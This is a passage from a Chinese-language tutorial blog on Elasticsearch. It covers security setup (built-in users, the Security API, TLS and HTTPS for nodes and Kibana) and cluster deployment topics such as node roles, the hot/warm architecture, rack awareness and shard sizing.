title="创建内置的用户和角色"></a>创建内置的用户和角色</h3><ul><li>内置的角色与用户</li></ul><table><thead><tr><th align="left">用户</th><th align="left">角色</th></tr></thead><tbody><tr><td align="left">elastic</td><td align="left">Supper User</td></tr><tr><td align="left">kibana</td><td align="left">The user that is used by Kibana to connect and communicate with Elasticsearch.</td></tr><tr><td align="left">logstash_system</td><td align="left">The user that is used by Logstash when storing monitoring information in Elasticsearch.</td></tr><tr><td align="left">beats_system</td><td align="left">The user that the different Beats use when storing monitoring information in Elasticsearch.</td></tr><tr><td align="left">apm_system</td><td align="left">The user that the APM server uses when storing monitoring information in Elasticsearch.</td></tr><tr><td align="left">Remote_monitoring_user</td><td align="left">The user that is used by Metricbeat when collecting and storing monitoring information in Elasticsearch.</td></tr></tbody></table><h3 id="使用-Security-API-创建用户"><a href="#使用-Security-API-创建用户" class="headerlink" title="使用 Security API 创建用户"></a>使用 Security API 创建用户</h3><table><thead><tr><th align="left"></th><th></th></tr></thead><tbody><tr><td align="left">User</td><td>Create user <br/> Update user <br/> Delete user <br/> Enable / disable users <br/> Get users <br/> Change password</td></tr><tr><td align="left">Role</td><td>Create Role <br/> Update Role <br/> Delete Role <br/> Get roles</td></tr></tbody></table><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /_security/user/richard</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"password"</span>: <span class="string">"123456"</span>,</span><br><span class="line">  <span class="attr">"roles"</span>: [<span class="string">"admin"</span>],</span><br><span class="line">  <span class="attr">"full_name"</span>: <span class="string">"Richard Xin"</span>,</span><br><span class="line">  <span class="attr">"email"</span>:<span class="string">"xinlichao2016@gmail.com"</span>,</span><br><span class="line">  <span class="attr">"metadata"</span>: &#123;</span><br><span class="line">    <span class="attr">"intelligence"</span>: <span class="number">7</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="开启并配置-X-Pack-的认证与鉴权"><a href="#开启并配置-X-Pack-的认证与鉴权" class="headerlink" title="开启并配置 X-Pack 的认证与鉴权"></a>开启并配置 X-Pack 的认证与鉴权</h3><ul><li>修改配置文件，打开认证于授权<ul><li><code>bin/elasticsearch -E node.name=node0 -E cluster.name=demo -E path.data=node0_data -E http.port=9200 -E xpack.security.enabled=true</code></li></ul></li><li>创建默认的用户和分组<ul><li><code>bin/elasticsearch-setup-passwords interactive</code></li></ul></li><li>当集群开启身份认证之后，配置 Kibana</li></ul><h3 id="配置-Kibana"><a href="#配置-Kibana" class="headerlink" title="配置 Kibana"></a>配置 Kibana</h3><ul><li>修改 kibana.yml<ul><li>elasticsearch.username: “kibana”</li><li>elasticsearch.password: “changeme”</li></ul></li></ul><h2 id="集群内部间的安全通信"><a href="#集群内部间的安全通信" class="headerlink" title="集群内部间的安全通信"></a>集群内部间的安全通信</h2><h3 id="为啥要加密通讯"><a href="#为啥要加密通讯" class="headerlink" title="为啥要加密通讯"></a>为啥要加密通讯</h3><ul><li>加密数据 - 避免数据抓包，敏感信息泄露</li><li>验证身份 - 避免 Imposter Node<ul><li>Data / Cluster State</li></ul></li></ul><p><img src="/images/big-data/es-07/3.jpg" alt="3"></p><h3 id="为节点创建证书"><a href="#为节点创建证书" class="headerlink" title="为节点创建证书"></a>为节点创建证书</h3><ul><li>TLS<ul><li>TLS 协议要求 Trusted Certificate Authority（CA）签发的 X.509 的证书</li></ul></li><li>证书认证的不同级别<ul><li>Certificate – 节点加入需要使用相同 CA 签发的证书</li><li>Full Verification – 节点加入集群需要相同 CA 签发的证书，还需要验证 Host name 或 IP 地址</li><li>No Verification – 任何节点都可以加入，开发环境中用于诊断目的</li></ul></li></ul><h3 id="生成节点证书"><a href="#生成节点证书" class="headerlink" title="生成节点证书"></a>生成节点证书</h3><ul><li>bin/elasticsearch-certutil ca</li><li>bin/elasticsearch-certutil cert –ca elastic-stack-ca.p12</li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/configuring-tls.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/configuring-tls.html</a></li></ul><h3 id="配置节点间通讯"><a href="#配置节点间通讯" class="headerlink" title="配置节点间通讯"></a>配置节点间通讯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成证书</span></span><br><span class="line"><span class="comment"># 为您的Elasticearch集群创建一个证书颁发机构。例如，使用elasticsearch-certutil ca命令：</span></span><br><span class="line">bin/elasticsearch-certutil ca</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为群集中的每个节点生成证书和私钥。例如，使用elasticsearch-certutil cert 命令：</span></span><br><span class="line">bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将证书拷贝到 config/certs目录下</span></span><br><span class="line">elastic-certificates.p12</span><br><span class="line"></span><br><span class="line">bin/elasticsearch -E node.name=node0 -E cluster.name=demo -E path.data=node0_data -E http.port=9200 -E xpack.security.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.verification_mode=certificate -E xpack.security.transport.ssl.keystore.path=certs/elastic-certificates.p12 -E xpack.security.transport.ssl.truststore.path=certs/elastic-certificates.p12</span><br><span class="line"></span><br><span class="line">bin/elasticsearch -E node.name=node1 -E cluster.name=demo -E path.data=node1_data -E http.port=9201 -E xpack.security.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.verification_mode=certificate -E xpack.security.transport.ssl.keystore.path=certs/elastic-certificates.p12 -E xpack.security.transport.ssl.truststore.path=certs/elastic-certificates.p12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不提供证书的节点，无法加入</span></span><br><span class="line">bin/elasticsearch -E node.name=node2 -E cluster.name=demo -E path.data=node2_data -E http.port=9202 -E xpack.security.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.verification_mode=certificate</span><br></pre></td></tr></table></figure><p><strong>elasticsearch.yml 配置</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">xpack.security.transport.ssl.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">xpack.security.transport.ssl.verification_mode:</span> <span class="string">certificate</span></span><br><span class="line"><span class="attr">xpack.security.transport.ssl.keystore.path:</span> <span class="string">certs/elastic-certificates.p12</span></span><br><span class="line"><span class="attr">xpack.security.transport.ssl.truststore.path:</span> <span class="string">certs/elastic-certificates.p12</span></span><br></pre></td></tr></table></figure><h2 id="集群与外部间的安全通信"><a href="#集群与外部间的安全通信" class="headerlink" title="集群与外部间的安全通信"></a>集群与外部间的安全通信</h2><h3 id="为什么需要-HTTPS"><a href="#为什么需要-HTTPS" class="headerlink" title="为什么需要 HTTPS"></a>为什么需要 HTTPS</h3><p><img src="/images/big-data/es-07/5.jpg" alt="5"></p><p>在外部通信的场景下需要 HTTPS 保护我们的数据。</p><h3 id="配置-Elasticsearch-for-HTTPS"><a href="#配置-Elasticsearch-for-HTTPS" class="headerlink" title="配置 Elasticsearch for HTTPS"></a>配置 Elasticsearch for HTTPS</h3><p><strong>elasticsearch.yml 配置</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">xpack.security.http.ssl.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">xpack.security.http.ssl.keystore.path:</span> <span class="string">certs/elastic-certificates.p12</span></span><br><span class="line"><span class="attr">xpack.security.http.ssl.truststore.path:</span> <span class="string">certs/elastic-certificates.p12</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ES 启用 https</span></span><br><span class="line">bin/elasticsearch -E node.name=node0 -E cluster.name=demo -E path.data=node0_data -E http.port=9200 -E xpack.security.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.enabled=<span class="literal">true</span> -E xpack.security.transport.ssl.verification_mode=certificate -E xpack.security.transport.ssl.keystore.path=certs/elastic-certificates.p12 -E xpack.security.http.ssl.enabled=<span class="literal">true</span> -E xpack.security.http.ssl.keystore.path=certs/elastic-certificates.p12 -E xpack.security.http.ssl.truststore.path=certs/elastic-certificates.p12</span><br></pre></td></tr></table></figure><h3 id="配置-Kibana-连接-ES-HTTPS"><a href="#配置-Kibana-连接-ES-HTTPS" class="headerlink" title="配置 Kibana 连接 ES HTTPS"></a>配置 Kibana 连接 ES HTTPS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为kibana生成pem</span></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> elastic-certificates.p12 -cacerts -nokeys -out elastic-ca.pem</span><br></pre></td></tr></table></figure><p><strong>config/kibana.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">elasticsearch.hosts:</span> <span class="string">["https://localhost:9200"]</span></span><br><span class="line"><span class="attr">elasticsearch.ssl.certificateAuthorities:</span> <span class="string">[</span> <span class="string">"/Users/richard/demo/kibana/config/certs/elastic-ca.pem"</span> <span class="string">]</span></span><br><span class="line"><span class="attr">elasticsearch.ssl.verificationMode:</span> <span class="string">certificate</span></span><br></pre></td></tr></table></figure><h3 id="配置使用-HTTPS-访问-Kibana"><a href="#配置使用-HTTPS-访问-Kibana" class="headerlink" title="配置使用 HTTPS 访问 Kibana"></a>配置使用 HTTPS 访问 Kibana</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为 Kibna 配置 HTTPS</span></span><br><span class="line"><span class="comment"># 在 ES 中执行</span></span><br><span class="line"><span class="comment"># 生成了一个 elastic-stac-ca.zip文件，解压，包含了 instance.crt 和 instance.key</span></span><br><span class="line">bin/elasticsearch-certutil ca --pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将这两个文件复制到 kibana/config/certs</span></span><br></pre></td></tr></table></figure><p><strong>config/kibana.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.ssl.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">server.ssl.certificate:</span> <span class="string">config/certs/instance.crt</span></span><br><span class="line"><span class="attr">server.ssl.key:</span> <span class="string">config/certs/instance.key</span></span><br></pre></td></tr></table></figure><blockquote><p>自签的证书会报一些错误</p></blockquote><h2 id="常见的集群部署方式"><a href="#常见的集群部署方式" class="headerlink" title="常见的集群部署方式"></a>常见的集群部署方式</h2><h3 id="节点类型"><a href="#节点类型" class="headerlink" title="节点类型"></a>节点类型</h3><ul><li>不同角色的节点<ul><li>Master eligible / Data / Ingest / Coordinating / Machine Learning</li></ul></li><li>在开发环境中，一个节点可承担多种角色</li><li>在生产环境中<ul><li>根据数据量，写入和查询的吞吐量，选择适合的部署方式</li><li>建议设置单一角色的节点（dedicated node）</li></ul></li></ul><h3 id="节点参数配置"><a href="#节点参数配置" class="headerlink" title="节点参数配置"></a>节点参数配置</h3><p>一个节点在默认情况下会同时扮演： master eligible，data node 和 ingest node</p><table><thead><tr><th align="center">节点类型</th><th align="center">配置参数</th><th align="center">默认值</th></tr></thead><tbody><tr><td align="center">maste eligible</td><td align="center">node.master</td><td align="center">true</td></tr><tr><td align="center">data</td><td align="center">node.data</td><td align="center">true</td></tr><tr><td align="center">ingest</td><td align="center">node.ingest</td><td align="center">true</td></tr><tr><td align="center">coordinating only</td><td align="center">无</td><td align="center">每个节点默认都是 coordinating 节点。coordinating only 设置其他类型全部为false</td></tr><tr><td align="center">machine learning</td><td align="center">node.ml</td><td align="center">true（需enablex-pack）</td></tr></tbody></table><h3 id="单一职责的节点"><a href="#单一职责的节点" class="headerlink" title="单一职责的节点"></a>单一职责的节点</h3><p>一个节点只承担一个角色</p><p><img src="/images/big-data/es-07/6.jpg" alt="6"></p><h3 id="单一角色：职责分离的好处"><a href="#单一角色：职责分离的好处" class="headerlink" title="单一角色：职责分离的好处"></a>单一角色：职责分离的好处</h3><ul><li>Dedicated master eligible nodes：负责集群状态（cluster state）的管理<ul><li>使用低配置的 CPU, RAM 和磁盘</li></ul></li><li>Dedicated data nodes：负责数据存储及处理客户端请求<ul><li>使用高配置的 CPU, RAM 和磁盘</li></ul></li><li>Dedicated ingest nodes：负责数据处理<ul><li>使用高配置的 CPU; 中等配置的 RAM; 低配置的磁盘</li></ul></li></ul><h3 id="Dedicate-Coordinating-Only-Node-Client-Node"><a href="#Dedicate-Coordinating-Only-Node-Client-Node" class="headerlink" title="Dedicate Coordinating Only Node (Client Node)"></a>Dedicate Coordinating Only Node (Client Node)</h3><ul><li>配置：将 Master，Data，Ingest 都配置成 Flase<ul><li>Medium / High CUP; Medium / High RAM; Low Disk</li></ul></li><li>生产环境中，建议为一些大的集群配置 Coordinating Only Nodes<ul><li>扮演 Load Balancers。 降低 Master 和 Data Nodes 的负载</li><li>负载搜索结果的 Gather / Reduce</li><li>有时候无法预知客户端会发生怎样的请求<ul><li>大量占用内存的结合操作，一个深度聚合可能引发 OOM</li></ul></li></ul></li></ul><h3 id="Dedicate-Master-Node"><a href="#Dedicate-Master-Node" class="headerlink" title="Dedicate Master Node"></a>Dedicate Master Node</h3><ul><li>从高可用 &amp; 避免脑裂的角色出发<ul><li>一般在生产环境中配置 3 台</li><li>一个集群只有 1 台活跃的主节点<ul><li>负载分片管理，索引创建，集群管理等操作</li></ul></li></ul></li><li>如果和数据节点或者 Coordinate 节点混合部署<ul><li>数据节点相对有比较大的内存占用</li><li>Coordinate 节点有时候可能会有开销很高的查询，导致 OOM</li><li>这些都有可能影响 Master 节点，导致集群的不稳定</li></ul></li></ul><h3 id="基本部署：增减节点，水平扩展"><a href="#基本部署：增减节点，水平扩展" class="headerlink" title="基本部署：增减节点，水平扩展"></a>基本部署：增减节点，水平扩展</h3><p>当磁盘容量无法满足需求时，可以增加数据节点；磁盘读写压力大时，增加数据节点</p><p><img src="/images/big-data/es-07/7.jpg" alt="7"></p><h3 id="水平扩展：Coordinating-Only-Node"><a href="#水平扩展：Coordinating-Only-Node" class="headerlink" title="水平扩展：Coordinating Only Node"></a>水平扩展：Coordinating Only Node</h3><p>当系统中有大量的复杂查询及聚合时候，增加 Coordinating 节点，增加查询的性能</p><p><img src="/images/big-data/es-07/8.jpg" alt="8"></p><h3 id="读写分离"><a href="#读写分离" class="headerlink" title="读写分离"></a>读写分离</h3><p><img src="/images/big-data/es-07/9.jpg" alt="9"></p><h3 id="在集群里部署-Kibana"><a href="#在集群里部署-Kibana" class="headerlink" title="在集群里部署 Kibana"></a>在集群里部署 Kibana</h3><p><img src="/images/big-data/es-07/10.jpg" alt="10"></p><h3 id="异地多活的部署"><a href="#异地多活的部署" class="headerlink" title="异地多活的部署"></a>异地多活的部署</h3><p>集群处在三个数据中心；数据三写；GTM 分发读请求</p><p><img src="/images/big-data/es-07/11.jpg" alt="11"></p><h2 id="Hot-amp-Warm-架构与-Shard-Filtering"><a href="#Hot-amp-Warm-架构与-Shard-Filtering" class="headerlink" title="Hot &amp; Warm 架构与 Shard Filtering"></a>Hot &amp; Warm 架构与 Shard Filtering</h2><h3 id="日志类应用的部署结构"><a href="#日志类应用的部署结构" class="headerlink" title="日志类应用的部署结构"></a>日志类应用的部署结构</h3><p><img src="/images/big-data/es-07/12.jpg" alt="12"></p><h3 id="什么是-Hot-amp-Warm-Architecture"><a href="#什么是-Hot-amp-Warm-Architecture" class="headerlink" title="什么是 Hot &amp; Warm Architecture"></a>什么是 Hot &amp; Warm Architecture</h3><ul><li>Hot &amp; Warm Architecture<ul><li>数据通常不会有 Update 操作；适用于 Time based 索引数据（生命周期管理），同时数据量比较大的<br>场景</li><li>引入 Warm 节点，低配置大容量的机器存放老数据，以降低部署成本</li></ul></li><li>两类数据节点，不同的硬件配置<ul><li>Hot 节点（通常使用 SSD）：索引有不断有新文档写入。通常使用 SSD</li><li>Warm 节点（通常使用 HDD）：索引不存在新数据的写入；同时也不存在大量的数据查询</li></ul></li></ul><h3 id="Hot-Nodes"><a href="#Hot-Nodes" class="headerlink" title="Hot Nodes"></a>Hot Nodes</h3><ul><li>用于数据的写入<ul><li>Indexing 对 CPU 和 IO 都有很高的要求。所以需要使用高配置的机器</li><li>存储的性能要好。建议使用 SSD</li></ul></li></ul><p><img src="/images/big-data/es-07/13.jpg" alt="13"></p><h3 id="Warm-Nodes"><a href="#Warm-Nodes" class="headerlink" title="Warm Nodes"></a>Warm Nodes</h3><ul><li>用于保存只读的索引，比较旧的数据<ul><li>通常使用大容量的磁盘（通常是 Spinning Disks）</li></ul></li></ul><p><img src="/images/big-data/es-07/14.jpg" alt="14"></p><h3 id="配置-Hot-amp-Warm-Architecture"><a href="#配置-Hot-amp-Warm-Architecture" class="headerlink" title="配置 Hot &amp; Warm Architecture"></a>配置 Hot &amp; Warm Architecture</h3><ul><li>使用 Shard Filtering，步骤分为以下几步<ul><li>标记节点 （Tagging）</li><li>配置索引到 Hot Node</li><li>配置索引到 Warm 节点</li></ul></li></ul><h3 id="标记节点"><a href="#标记节点" class="headerlink" title="标记节点"></a>标记节点</h3><ul><li>需要通过 “node.attr” 来标记一个节点<ul><li>节点的 attribute 可以是任何的 key/value</li><li>可以通过 elasticsearch.yml 或者通过 –E 命令指定</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 标记一个 Hot 节点</span></span><br><span class="line">bin/elasticsearch  -E node.name=hotnode -E cluster.name=demo -E path.data=hot_data -E node.attr.my_node_type=hot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标记一个 warm 节点</span></span><br><span class="line">bin/elasticsearch  -E node.name=warmnode -E cluster.name=demo -E path.data=warm_data -E node.attr.my_node_type=warm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看节点</span></span><br><span class="line">GET /_cat/nodeattrs?v</span><br></pre></td></tr></table></figure><h3 id="配置-Hot-数据"><a href="#配置-Hot-数据" class="headerlink" title="配置 Hot 数据"></a>配置 Hot 数据</h3><p>创建索引时候，指定将其创建在 hot 节点上</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置到 Hot节点</span></span><br><span class="line">PUT logs-2019-06-27</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>:&#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>:<span class="number">2</span>,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="attr">"index.routing.allocation.require.my_node_type"</span>:<span class="string">"hot"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _cat/shards?v</span><br></pre></td></tr></table></figure><h3 id="旧数据移动到-Warm-节点"><a href="#旧数据移动到-Warm-节点" class="headerlink" title="旧数据移动到 Warm 节点"></a>旧数据移动到 Warm 节点</h3><ul><li><code>Index.routing.allocation</code> 是一个索引级的 dynamic setting，可以通过 API 在后期进行设定<ul><li>Curator / Index Life Cycle Management Tool</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置到 warm 节点</span></span><br><span class="line">PUT PUT logs-2019-06-27/_settings</span><br><span class="line">&#123;  </span><br><span class="line">  <span class="attr">"index.routing.allocation.require.my_node_type"</span>:<span class="string">"warm"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Rack-Awareness"><a href="#Rack-Awareness" class="headerlink" title="Rack Awareness"></a>Rack Awareness</h3><ul><li>ES 的节点可能分布在不同的机架<ul><li>当一个机架断电，可能会同时丢失几个节点</li><li>如果一个索引相同的主分片和副本分片，同时在这个机架上，就有可能导致数据的丢失</li><li>通过 Rack Awareness 的机制，就可以尽可能避免将同一个索引的主副分片同时分配在一个机架的节点上</li><li>一个机架断电，数据可以恢复</li></ul></li></ul><p><img src="/images/big-data/es-07/15.jpg" alt="15"></p><h3 id="标记-Rack-节点-配置集群"><a href="#标记-Rack-节点-配置集群" class="headerlink" title="标记 Rack 节点 + 配置集群"></a>标记 Rack 节点 + 配置集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 标记一个 rack 1</span></span><br><span class="line">bin/elasticsearch  -E node.name=node1 -E cluster.name=deom -E path.data=node1_data -E node.attr.my_rack_id=rack1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 标记一个 rack 2</span></span><br><span class="line">bin/elasticsearch  -E node.name=node2 -E cluster.name=demo -E path.data=node2_data -E node.attr.my_rack_id=rack2</span><br><span class="line"></span><br><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"persistent"</span>: &#123;</span><br><span class="line">    <span class="string">"cluster.routing.allocation.awareness.attributes"</span>: <span class="string">"my_rack_id"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_index1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"settings"</span>:&#123;</span><br><span class="line">    <span class="string">"number_of_shards"</span>:2,</span><br><span class="line">    <span class="string">"number_of_replicas"</span>:1</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_index1/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _cat/shards?v</span><br><span class="line">DELETE my_index1/_doc/1</span><br></pre></td></tr></table></figure><h3 id="Fore-awareness"><a href="#Fore-awareness" class="headerlink" title="Fore awareness"></a>Fore awareness</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT _cluster/settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"persistent"</span>: &#123;</span><br><span class="line">    <span class="attr">"cluster.routing.allocation.awareness.attributes"</span>: <span class="string">"my_rack_id"</span>,</span><br><span class="line">    <span class="attr">"cluster.routing.allocation.awareness.force.my_rack_id.values"</span>: <span class="string">"rack1,rack2"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">GET _cluster/settings</span><br><span class="line"></span><br><span class="line"><span class="comment">// 集群黄色</span></span><br><span class="line">GET _cluster/health</span><br><span class="line"></span><br><span class="line"><span class="comment">// 副本无法分配</span></span><br><span class="line">GET _cat/shards?v</span><br><span class="line"></span><br><span class="line">GET _cluster/allocation/explain?pretty</span><br></pre></td></tr></table></figure><h3 id="Shard-Filtering"><a href="#Shard-Filtering" class="headerlink" title="Shard Filtering"></a>Shard Filtering</h3><ul><li>Shard Filtering<ul><li>node.attr - 标记节点</li><li>index.routing.allocation – 分配索引到节点</li></ul></li></ul><table><thead><tr><th align="left">设置</th><th align="left">分配索引到节点，节点的属性规则</th></tr></thead><tbody><tr><td align="left"><code>Index.routing.allocation.include.{attr}</code></td><td align="left">至少包含一个值</td></tr><tr><td align="left"><code>Index.routing.allocation.exclude.{attr}</code></td><td align="left">不能包含任何一个值</td></tr><tr><td align="left"><code>Index.routing.allocation.require.{attr}</code></td><td align="left">所有值都需要包含</td></tr></tbody></table><h2 id="分片设定及管理"><a href="#分片设定及管理" class="headerlink" title="分片设定及管理"></a>分片设定及管理</h2><h3 id="单个分片"><a href="#单个分片" class="headerlink" title="单个分片"></a>单个分片</h3><ul><li>7.0 开始，新创建一个索引时，默认只有一个主分片<ul><li>单个分片，查询算分，聚合不准的问题都可以得以避免</li></ul></li><li>单个索引，单个分片时候，集群无法实现水平扩展<ul><li>即使增加新的节点，无法实现水平扩展</li></ul></li></ul><p><img src="/images/big-data/es-07/16.jpg" alt="16"></p><h3 id="两个分片"><a href="#两个分片" class="headerlink" title="两个分片"></a>两个分片</h3><p>集群增加一个节点后，Elasticsearch 会自动进行分片的移动，也叫 Shard Rebalancing</p><p><img src="/images/big-data/es-07/17.jpg" alt="17"></p><h3 id="如何设计分片数"><a href="#如何设计分片数" class="headerlink" title="如何设计分片数"></a>如何设计分片数</h3><ul><li>当分片数 &gt; 节点数时<ul><li>一旦集群中有新的数据节点加入，分片就可以自动进行分配</li><li>分片在重新分配时，系统不会有 downtime</li></ul></li><li>多分片的好处：一个索引如果分布在不同的节点，多个节点可以并行执行<ul><li>查询可以并行执行</li><li>数据写入可以分散到多个机器</li></ul></li></ul><h3 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h3><ul><li>案例 1<ul><li>每天 1 GB 的数据，一个索引一个主分片，一个副本分片</li><li>需保留半年的数据，接近 360 GB 的数据量</li></ul></li><li>案例 2<ul><li>5 个不同的日志，每天创建一个日志索引。每个日志索引创建 10 个主分片</li><li>保留半年的数据</li><li><code>5 * 10 * 30 * 6 = 9000</code> 个分片</li></ul></li></ul><h3 id="分片过多所带来的副作用"><a href="#分片过多所带来的副作用" class="headerlink" title="分片过多所带来的副作用"></a>分片过多所带来的副作用</h3><ul><li>Shard 是 Elasticsearch 实现集群水平扩展的最小单位</li><li>过多设置分片数会带来一些潜在的问题<ul><li>每个分片是一个 Lucene 的 索引，会使用机器的资源。过多的分片会导致额外的性能开销<ul><li>Lucene Indices / File descriptors / RAM / CPU</li><li>每次搜索的请求，需要从每个分片上获取数据</li><li>分片的 Meta 信息由 Master 节点维护。过多，会增加管理的负担。经验值，控制分片总数在 10 W 以内</li></ul></li></ul></li></ul><h3 id="如何确定主分片数"><a href="#如何确定主分片数" class="headerlink" title="如何确定主分片数"></a>如何确定主分片数</h3><ul><li>从存储的物理角度看<ul><li>日志类应用，单个分片不要大于 50 GB</li><li>搜索类应用，单个分片不要超过 20 GB</li></ul></li><li>为什么要控制分片存储大小<ul><li>提高 Update 的性能</li><li>Merge 时，减少所需的资源</li><li>丢失节点后，具备更快的恢复速度 / 便于分片在集群内 Rebalancing</li></ul></li></ul><h3 id="如何确定副本分片数"><a href="#如何确定副本分片数" class="headerlink" title="如何确定副本分片数"></a>如何确定副本分片数</h3><ul><li>副本是主分片的拷贝<ul><li>提高系统可用性：相应查询请求，防止数据丢失</li><li>需要占用和主分片一样的资源</li></ul></li><li>对性能的影响<ul><li>副本会降低数据的索引速度：有几份副本就会有几倍的 CPU 资源消耗在索引上</li><li>会减缓对主分片的查询压力，但是会消耗同样的内存资源<ul><li>如果机器资源充分，提高副本数，可以提高整体的查询 QPS</li></ul></li></ul></li></ul><h3 id="调整分片总数设定，避免分配不均衡"><a href="#调整分片总数设定，避免分配不均衡" class="headerlink" title="调整分片总数设定，避免分配不均衡"></a>调整分片总数设定，避免分配不均衡</h3><ul><li>ES 